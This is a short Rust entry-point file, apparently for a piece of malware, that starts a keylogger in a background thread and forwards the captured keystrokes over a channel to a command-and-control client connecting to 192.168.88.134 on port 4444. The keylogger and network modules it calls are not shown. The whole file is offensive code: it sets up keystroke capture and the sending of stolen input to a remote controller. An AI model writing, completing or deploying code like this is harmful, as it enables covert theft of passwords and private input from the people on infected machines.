mod modules;

use modules::{logger, network};
use std::sync::mpsc;

fn main() {
    let (tx, rx) = mpsc::channel();

    std::thread::spawn(move || {
        logger::start_keylogger(tx);
    });

    network::start_c2_client(rx, "192.168.88.134", 4444);
}
